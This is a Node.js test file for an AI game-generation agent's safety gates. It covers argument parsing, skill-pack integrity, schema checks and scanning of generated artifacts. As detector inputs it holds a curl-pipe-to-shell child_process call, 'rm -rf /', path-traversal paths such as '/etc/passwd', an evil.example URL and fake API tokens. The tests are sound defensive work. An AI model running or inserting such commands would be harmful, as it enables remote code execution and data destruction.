import test from 'node:test';
import assert from 'node:assert/strict';
import { cp, mkdir, writeFile, readFile } from 'node:fs/promises';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { parseAgentArgs } from '../commands/agent.mjs';
import { loadSkillPack, computeSkillLock, SKILL_NAMES, SKILLS_ROOT, receiptMatches } from '../lib/agent/skills.mjs';
import { stageInstructions, STAGES } from '../lib/agent/stages.mjs';
import { validateSchema } from '../lib/agent/schema.mjs';
import { gateArchitecture, gateImplementation, gatePlan, gatePlaytestScript, gatePublish, scanArtifacts, admitArtifactPath } from '../lib/agent/gates.mjs';
import { admitRequest, containsSecret, externalUrls } from '../lib/agent/safety.mjs';
import { classifyPublishFailure, normalizePublish, normalizeQuota, providerFailure } from '../lib/agent/adapters.mjs';
import { AgentError } from '../lib/agent/errors.mjs';
import { ARCHITECTURE, GAME_FILES, META, PLAN, SCRIPT, SKILLS, implementation, tmp } from './agent-fixtures.test.mjs';

const code = (fn, expected) => { let caught; assert.throws(fn, error => { caught = error; return true; }); assert.equal(caught.code, expected); return caught; };
const files = patch => implementation({ ...GAME_FILES, ...patch }).files;

test('args: modes, values and strict rejection before any I/O', () => {
  assert.deepEqual({ ...parseAgentArgs(['make', 'a', 'runner']) }, { yolo: false, draft: false, request: 'make a runner', mode: 'local' });
  const yolo = parseAgentArgs(['a game', '--yolo', '--name', 'my-game', '--model=gpt-x.1', '--browser', '/usr/bin/chromium']);
  assert.equal(yolo.mode, 'yolo'); assert.equal(yolo.name, 'my-game'); assert.equal(yolo.model, 'gpt-x.1'); assert.equal(yolo.browser, '/usr/bin/chromium');
  assert.equal(parseAgentArgs(['x', '--draft']).mode, 'draft');
  assert.equal(parseAgentArgs(['x', '--model', 'openrouter/anthropic/claude-example']).model, 'openrouter/anthropic/claude-example');
  assert.equal(parseAgentArgs(['--resume', 'run_20261003120000_0123abcd', '--yolo']).resume, 'run_20261003120000_0123abcd');
  assert.equal(parseAgentArgs(['--', '--yolo']).request, '--yolo');
  for (const bad of [
    ['x', '--no-skills'], ['x', '--skip-playtest'], ['x', '--json'], ['x', '--yolo', '--draft'], ['x', '--yolo', '--yolo'], ['x', '--yolo=1'],
    ['x', '--name', 'Bad Name'], ['x', '--name', '../up'], ['x', '--name'], ['x', '--model', 'a b'], ['x', '--browser', 'relative/chrome'],
    ['--resume', 'nope'], ['x', '--resume', 'run_20261003120000_0123abcd'], ['--resume', 'run_20261003120000_0123abcd', '--name', 'a'], ['x\0y'], [42],
  ]) code(() => parseAgentArgs(bad), 'INVALID_INPUT');
});

test('skills: pinned pack verifies; tampering, missing files and version drift fail closed', async t => {
  const pack = await loadSkillPack();
  assert.equal(pack.receipts().length, 5);
  assert.deepEqual(await computeSkillLock(), JSON.parse(await readFile(new URL('../lib/agent/skill-lock.json', import.meta.url), 'utf8')), 'skill-lock.json must match the shipped SKILL.md files');
  const dir = await tmp(t);
  const root = join(dir, 'skills');
  await cp(SKILLS_ROOT, root, { recursive: true });
  const rootUrl = pathToFileURL(root + '/');
  await loadSkillPack({ root: rootUrl });
  const path = join(root, 'game-playtest', 'SKILL.md');
  const original = await readFile(path, 'utf8');
  await writeFile(path, original.replace('real sandboxed Chromium', 'model review'));
  await assert.rejects(loadSkillPack({ root: rootUrl }), error => error.code === 'AGENT_SKILL_INTEGRITY' && error.details.skill === 'game-playtest');
  await writeFile(path, original.replace('version: 1.0.0', 'version: 1.0.1'));
  await assert.rejects(loadSkillPack({ root: rootUrl }), { code: 'AGENT_SKILL_INTEGRITY' });
  await writeFile(path, original.replace(/\n/g, '\r\n'));
  await loadSkillPack({ root: rootUrl });
  await writeFile(path, '');
  await assert.rejects(loadSkillPack({ root: rootUrl }), { code: 'AGENT_SKILL_INTEGRITY' });
  await assert.rejects(loadSkillPack({ lock: { schema: 'zukujs-skill-lock/1', skills: {} } }), { code: 'AGENT_SKILL_INTEGRITY' });
});

test('skills: every stage injects its full skill text and the receipt must match exactly', () => {
  for (const [stage, definition] of Object.entries(STAGES)) {
    const skill = SKILLS.get(definition.skill);
    const instructions = stageInstructions(stage, skill);
    assert.ok(instructions.includes(skill.body), stage);
    assert.ok(instructions.includes(skill.sha256));
    assert.ok(receiptMatches({ name: skill.name, version: skill.version, sha256: skill.sha256 }, skill));
    assert.ok(!receiptMatches({ name: skill.name, version: skill.version, sha256: '0'.repeat(64) }, skill));
    assert.ok(!receiptMatches(true, skill), 'a boolean is never a skill receipt');
  }
  assert.deepEqual([...new Set(Object.values(STAGES).map(item => item.skill))].sort(), [...SKILL_NAMES].sort());
});

test('schema: strict outputs reject extras, missing fields and wrong types', () => {
  assert.deepEqual(validateSchema(STAGES.design.schema, PLAN), []);
  assert.ok(validateSchema(STAGES.design.schema, { ...PLAN, shell: 'rm -rf /' }).some(item => item.code === 'UNKNOWN_FIELD'));
  const { core_loop, ...missing } = PLAN;
  assert.ok(validateSchema(STAGES.design.schema, missing).some(item => item.code === 'REQUIRED'));
  assert.ok(validateSchema(STAGES.design.schema, { ...PLAN, input_actions: [{ ...PLAN.input_actions[0], keys: ['F12'] }] }).some(item => item.code === 'ENUM'));
  assert.ok(validateSchema(STAGES.playtest.schema, { ...SCRIPT, smoke: [{ action: 'left', hold_ms: 99999, wait_ms: 0 }] }).some(item => item.code === 'MAXIMUM'));
  assert.ok(validateSchema(STAGES.implementation.schema, { ...implementation(), files: 'x' }).length);
});

test('plan gate: verbs, loop, loss/reset, explicit input mapping, DOM HUD/menus and assets', () => {
  assert.deepEqual(gatePlan(PLAN), []);
  assert.ok(gatePlan({ ...PLAN, loss_or_reset: { ...PLAN.loss_or_reset, reset_action: 'jump' } }).includes('PLAN_RESET_ACTION_UNKNOWN'));
  assert.ok(gatePlan({ ...PLAN, input_actions: [...PLAN.input_actions, { id: 'dash', keys: ['KeyA'], pointer: false, purpose: 'dash' }] }).includes('PLAN_KEY_CONFLICT'));
  assert.ok(gatePlan({ ...PLAN, menus: [PLAN.menus[0]] }).includes('PLAN_GAME_OVER_MENU_MISSING'));
  assert.ok(gatePlan({ ...PLAN, hud: [{ id: 'menu-start', purpose: 'dup' }] }).includes('PLAN_DOM_ID_DUPLICATE'));
  assert.ok(gatePlan({ ...PLAN, asset_manifest: [{ ...PLAN.asset_manifest[0], source: 'procedural' }] }).includes('PLAN_ASSET_PATH_INVALID'));
  assert.ok(gatePlan({ ...PLAN, summary: 'see https://cdn.example.com' }).includes('PLAN_TEXT_UNSAFE'));
});

test('architecture gate: engine availability, roles, boundary, hook state and verbatim input mapping', () => {
  assert.deepEqual(gateArchitecture(ARCHITECTURE, PLAN, { engines: ['canvas'] }), []);
  assert.ok(gateArchitecture({ ...ARCHITECTURE, engine: { ...ARCHITECTURE.engine, name: 'phaser', uses_create_scaffold: false } }, PLAN, { engines: ['canvas'] }).includes('ARCH_ENGINE_UNAVAILABLE'));
  assert.ok(gateArchitecture({ ...ARCHITECTURE, modules: ARCHITECTURE.modules.filter(item => item.role !== 'simulation') }, PLAN, { engines: ['canvas'] }).includes('ARCH_SIMULATION_MISSING'));
  assert.ok(gateArchitecture({ ...ARCHITECTURE, boundary: { ...ARCHITECTURE.boundary, render_modules: ['src/main.js'] } }, PLAN, { engines: ['canvas'] }).includes('ARCH_BOUNDARY_MISMATCH'));
  assert.ok(gateArchitecture({ ...ARCHITECTURE, input_mapping: ARCHITECTURE.input_mapping.slice(1) }, PLAN, { engines: ['canvas'] }).includes('ARCH_INPUT_MISMATCH'));
  assert.ok(gateArchitecture({ ...ARCHITECTURE, state_shape: ARCHITECTURE.state_shape.filter(item => item.key !== 'tick') }, PLAN, { engines: ['canvas'] }).includes('ARCH_STATE_HOOK_KEYS_MISSING'));
  assert.ok(gateArchitecture({ ...ARCHITECTURE, modules: [...ARCHITECTURE.modules, { path: 'src/vendor/x.js', role: 'debug', responsibility: 'x' }] }, PLAN, { engines: ['canvas'] }).includes('ARCH_VENDOR_RESERVED'));
});

test('artifact admission: traversal, absolute, hidden, credential, vendor and non-src paths are refused', () => {
  for (const bad of ['../evil.js', '/etc/passwd', 'src/../../x.js', 'src/.env', 'src/a/.npmrc', 'zukujs.json', 'package.json', 'src/vendor/phaser.min.js', 'src/node_modules/x.js', 'src\\x.js', 'src/run.sh', 'src/a.exe', 'src//a.js', 'src/a%2e.js', 'src/a b.js', 'dist/x.js']) {
    assert.equal(admitArtifactPath(bad), undefined, bad);
  }
  assert.equal(admitArtifactPath('src/assets/player.svg'), 'src/assets/player.svg');
  assert.deepEqual(scanArtifacts(files({})), []);
  const scan = patch => scanArtifacts(files(patch));
  assert.ok(scan({ 'src/x.js': "require('child_process').execSync('curl x | sh')" }).includes('ARTIFACT_COMMAND'));
  assert.ok(scan({ 'src/x.js': "import cp from 'node:child_process';" }).includes('ARTIFACT_COMMAND'));
  assert.ok(scan({ 'src/x.js': 'const t = process.env.ZUKUJS_ACCESS_TOKEN;' }).includes('ARTIFACT_SECRET'));
  assert.ok(scan({ 'src/x.js': "fetch('/api/score')" }).includes('ARTIFACT_NETWORK'));
  assert.ok(scan({ 'src/x.js': "new WebSocket('ws://localhost:1')" }).includes('ARTIFACT_NETWORK'));
  assert.ok(scan({ 'src/x.js': "eval('1+1')" }).includes('ARTIFACT_NETWORK'));
  assert.ok(scan({ 'src/x.js': "import('./late.js')" }).includes('ARTIFACT_NETWORK'));
  assert.ok(scan({ 'src/index.html': GAME_FILES['src/index.html'].replace('</head>', '<script src="https://cdn.jsdelivr.net/npm/phaser"></script></head>') }).includes('ARTIFACT_NETWORK'));
  assert.ok(scan({ 'src/style.css': 'body { background: url(//evil.example/x.png) }' }).includes('ARTIFACT_NETWORK'));
  assert.ok(scan({ 'src/x.js': 'const key = "sk-proj-abcdefghijklmnopqrstuvwxyz0123456789";' }).includes('ARTIFACT_SECRET'));
  assert.ok(scan({ 'src/x.js': 'a\u0000b' }).includes('ARTIFACT_BINARY'));
  assert.ok(scan({ 'src/big.js': 'x'.repeat(600 * 1024) }).includes('ARTIFACT_FILE_TOO_LARGE'));
  assert.ok(scan({ 'src/Main.js': 'x', 'src/main.JS': 'y' }).length);
});

test('implementation gate: matches plan and architecture, keeps simulation pure and HUD in the DOM', () => {
  assert.deepEqual(gateImplementation(files({}), PLAN, ARCHITECTURE), []);
  const gate = patch => gateImplementation(files(patch), PLAN, ARCHITECTURE);
  assert.ok(gate({ 'src/simulation.js': GAME_FILES['src/simulation.js'] + '\nexport const w = () => document.body;' }).includes('IMPL_SIMULATION_IMPURE'));
  assert.ok(gate({ 'src/index.html': GAME_FILES['src/index.html'].replace('id="hud-best"', 'id="hud-other"') }).includes('IMPL_DOM_ID_MISSING'));
  assert.ok(gate({ 'src/index.html': GAME_FILES['src/index.html'].replace('<script type="module" src="main.js"></script>', '<script>window.x = 1</script>') }).includes('IMPL_INLINE_SCRIPT'));
  assert.ok(gate({ 'src/index.html': GAME_FILES['src/index.html'].replace('<h1>', '<h1 onclick="go()">') }).includes('IMPL_INLINE_HANDLER'));
  assert.ok(gate({ 'src/input.js': GAME_FILES['src/input.js'].replace("'KeyD'", "'KeyL'") }).includes('IMPL_INPUT_KEYS_MISSING'));
  assert.ok(gate({ 'src/main.js': GAME_FILES['src/main.js'].replace(/window\.__zukuGame[\s\S]*$/, '') }).includes('IMPL_HOOK_MISSING'));
  assert.ok(gate({ 'src/main.js': GAME_FILES['src/main.js'].replace("'./render.js'", "'three'") }).includes('IMPL_IMPORT_INVALID'));
  assert.ok(gate({ 'src/main.js': GAME_FILES['src/main.js'] + "\nlocalStorage.setItem('zuku:best', '1');" }).includes('IMPL_SAVE_UNPLANNED'));
  assert.ok(gateImplementation(files({ 'src/assets/player.svg': undefined }).filter(file => file.content !== undefined), PLAN, ARCHITECTURE).includes('IMPL_ASSET_MISSING'));
  const phaser = { ...ARCHITECTURE, engine: { name: 'phaser', reason: 'x', uses_create_scaffold: false } };
  assert.ok(gateImplementation(files({}), PLAN, phaser).includes('IMPL_ENGINE_MISMATCH'));
});

test('playtest script and publish metadata gates', () => {
  assert.deepEqual(gatePlaytestScript(SCRIPT, PLAN), []);
  assert.ok(gatePlaytestScript({ ...SCRIPT, smoke: [{ action: 'fly', hold_ms: 100, wait_ms: 2000 }] }, PLAN).includes('PLAYTEST_ACTION_UNKNOWN'));
  assert.ok(gatePlaytestScript({ ...SCRIPT, smoke: [{ action: 'left', hold_ms: 16, wait_ms: 0 }] }, PLAN).includes('PLAYTEST_SCRIPT_TOO_SHORT'));
  assert.ok(gatePlaytestScript({ ...SCRIPT, observe_hud_ids: ['nope'] }, PLAN).includes('PLAYTEST_HUD_UNKNOWN'));
  assert.deepEqual(gatePublish(META, PLAN), []);
  assert.ok(gatePublish({ ...META, description: 'Visit www.example.com now' }, PLAN).includes('PUBLISH_TEXT_UNSAFE'));
  assert.ok(gatePublish({ ...META, description: 'mail me at a@b.co' }, PLAN).includes('PUBLISH_TEXT_UNSAFE'));
  assert.ok(gatePublish({ ...META, platform: { pc: true, mobile: true, tablet: false } }, PLAN).includes('PUBLISH_PLATFORM_UNSUPPORTED'));
  assert.ok(gatePublish({ ...META, tags: ['a', 'a'] }, PLAN).includes('PUBLISH_TAG_DUPLICATE'));
});

test('safety: requests are bounded and secret-free; namespace URIs are the only allowed absolute URLs', () => {
  assert.equal(admitRequest('  a cozy puzzle  ', 4000), 'a cozy puzzle');
  assert.equal(admitRequest('x'.repeat(4001), 4000), undefined);
  assert.equal(admitRequest('use token ghp_abcdefghijklmnopqrstuvwxyz0123456789', 4000), undefined);
  assert.equal(admitRequest('bell\u0007', 4000), undefined);
  assert.equal(admitRequest('   ', 4000), undefined);
  assert.ok(containsSecret('Authorization: Bearer abcdefghijklmnopqrstuvwxyz012345'));
  assert.deepEqual(externalUrls('<svg xmlns="http://www.w3.org/2000/svg"></svg>'), []);
  assert.equal(externalUrls('<a href="https://x.y">').length, 1);
});

test('adapters: provider and publish failures map to allowlisted codes without remote text', () => {
  const raw = Object.assign(new Error('upstream said: sk-proj-SECRETSECRETSECRETSECRET1234 and stack'), { code: 'weird code!' });
  const mapped = providerFailure(raw);
  assert.equal(mapped.code, 'AGENT_PROVIDER_FAILED');
  assert.ok(!JSON.stringify(mapped.toJSON()).includes('SECRET'));
  assert.equal(providerFailure(Object.assign(new Error('x'), { code: 'CODEX_LOGIN_REQUIRED' })).code, 'AGENT_PROVIDER_UNAVAILABLE');
  for (const code of ['CODEX_AUTH_REQUIRED', 'CODEX_REAUTH_REQUIRED', 'CODEX_EXPERIMENTAL_REQUIRED']) {
    assert.equal(providerFailure({ code }).code, 'AGENT_PROVIDER_UNAVAILABLE');
  }
  assert.equal(providerFailure({ code: 'CODEX_AUTH_CANCELLED' }).code, 'COMMAND_CANCELLED');
  assert.equal(providerFailure(new Error('x'), AbortSignal.abort()).code, 'COMMAND_CANCELLED');
  assert.equal(classifyPublishFailure(Object.assign(new Error('t'), { name: 'TimeoutError' })).outcome, 'unknown');
  assert.equal(classifyPublishFailure({ ambiguous: true, httpStatus: 400 }).outcome, 'unknown');
  assert.equal(classifyPublishFailure({ httpStatus: 503 }).outcome, 'unknown');
  assert.equal(classifyPublishFailure({ httpStatus: 408 }).outcome, 'unknown');
  assert.equal(classifyPublishFailure({ httpStatus: 422, code: 'PACKAGE_REJECTED' }).error.code, 'AGENT_PUBLISH_REJECTED');
  const quota = classifyPublishFailure({ code: 'DEPLOY_QUOTA_EXCEEDED', httpStatus: 429, retry_after: 3600 });
  assert.equal(quota.error.code, 'DEPLOY_QUOTA_EXCEEDED'); assert.equal(quota.error.details.retry_after, 3600);
  assert.equal(classifyPublishFailure({ httpStatus: 400 }, AbortSignal.abort()).outcome, 'unknown', 'cancel mid-request is never assumed not to have committed');
  const cancelled = classifyPublishFailure({ definite: true, code: 'COMMAND_CANCELLED' }, AbortSignal.abort());
  assert.equal(cancelled.outcome, 'rejected');
  assert.equal(cancelled.error.code, 'COMMAND_CANCELLED');
  assert.equal(normalizePublish({ status: 'published', content_id: '../x' }), undefined);
  assert.equal(normalizePublish({ status: 'queued', content_id: 'cnt_1' }), undefined);
  assert.equal(normalizePublish({ status: 'published', content_id: 'cnt_1', url: 'http://plain' }).url, null);
  assert.throws(() => normalizeQuota({ limit: 3, used: '1', remaining: 2, window_seconds: 21600 }), { code: 'AGENT_DEPLOY_UNAVAILABLE' });
  assert.deepEqual(normalizeQuota({ quota: { limit: 3, window_seconds: 21600, used: 1, pending: 0, remaining: 2, reset_at: '2026-10-03T12:00:00Z', retry_after: 0 } }).remaining, 2);
  assert.throws(() => normalizeQuota({ quota: { limit: 3, window_seconds: 21600, used: 1, remaining: 2 } }), { code: 'AGENT_DEPLOY_UNAVAILABLE' });
  assert.equal(normalizeQuota({ limit: 3, window_seconds: 21600, used: 1, pending: 1, remaining: 1 }).pending, 1);
  for (const changed of [{ limit: 999 }, { window_seconds: 0 }, { used: 3 }, { pending: 4 }, { remaining: 3 }, { reset_at: 'invalid' }, { retry_after: -1 }, { retry_after: 21601 }, { retry_after: 1 }]) {
    assert.throws(() => normalizeQuota({ limit: 3, window_seconds: 21600, used: 1, remaining: 2, ...changed }), { code: 'AGENT_DEPLOY_UNAVAILABLE' });
  }
});

test('errors: only allowlisted details survive serialization', () => {
  const error = new AgentError('AGENT_GATE_FAILED', { codes: ['OK_CODE', 'bad code', '<script>'], stage: 'design', blob: { nested: true }, note: 'line\nbreak' });
  assert.deepEqual(error.toJSON().details, { codes: ['OK_CODE'], stage: 'design' });
  assert.equal(new AgentError('NOT_A_CODE').code, 'COMMAND_FAILED');
});
